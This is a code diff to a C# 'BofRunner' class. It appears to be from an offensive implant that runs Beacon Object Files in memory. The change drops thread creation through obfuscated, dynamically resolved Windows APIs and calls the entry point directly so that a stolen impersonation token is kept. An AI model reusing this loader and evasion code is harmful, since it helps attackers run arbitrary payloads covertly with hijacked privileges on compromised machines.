@@ -14,9 +14,7 @@ namespace Workflow
         public IntPtr entry_point;
         private readonly IAT iat;
         public Dictionary<string, string> parsed_args;
-        private delegate uint WfsoDelegate(IntPtr hThread, int timeout);
-        private delegate IntPtr CtDelegate(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddres, IntPtr param, uint dwCreationFlags, IntPtr lpThreadId);
-        private delegate bool gecDelegate(IntPtr hThread, out int lpExitcode);
+        private delegate int BofEntryDelegate(IntPtr param);
         public BofRunner(Dictionary<string,string> parsed_args)
         {
             this.parsed_args = parsed_args;
@@ -77,31 +75,13 @@ namespace Workflow
         {
             StringBuilder debug_output = new StringBuilder();
 
-            object[] ctParams = new object[] { IntPtr.Zero, (uint)0, this.entry_point, IntPtr.Zero, (uint)0, IntPtr.Zero };
-
-            IntPtr hThread = Generic.InvokeFunc<IntPtr>(Resolver.GetFunc("ct"), typeof(CtDelegate), ref ctParams);
-            uint thread_timeout = 0;
-            if (!uint.TryParse(this.parsed_args["timeout"], out thread_timeout)){
-                thread_timeout = 60;
-            }
-
-
-            object[] wfsoParams = new object[] { hThread, 86400 * 1000 };
-            uint resp = Generic.InvokeFunc<uint>(Resolver.GetFunc("wfso"), typeof(WfsoDelegate), ref wfsoParams);
-
-            if (resp == (uint)NativeDeclarations.WaitEventEnum.WAIT_TIMEOUT)
-            {
-                debug_output.AppendLine($"BOF timed out after {thread_timeout} seconds");
-            }
+            // Invoke the BOF entry point directly on the current thread
+            // to preserve any impersonation context (e.g. from the token command).
+            // Previously this used CreateThread which loses the impersonation token.
+            var entryDelegate = Marshal.GetDelegateForFunctionPointer<BofEntryDelegate>(this.entry_point);
+            int ExitCode = entryDelegate(IntPtr.Zero);
 
             Console.Out.Flush();
-
-            int ExitCode = 0;
-
-            object[] gecParams = new object[] { hThread, ExitCode };
-            bool result = Generic.InvokeFunc<bool>(Resolver.GetFunc("gect"), typeof(gecDelegate), ref gecParams);
-
-            ExitCode = (int)gecParams[1];
 
             if (ExitCode < 0)
             {
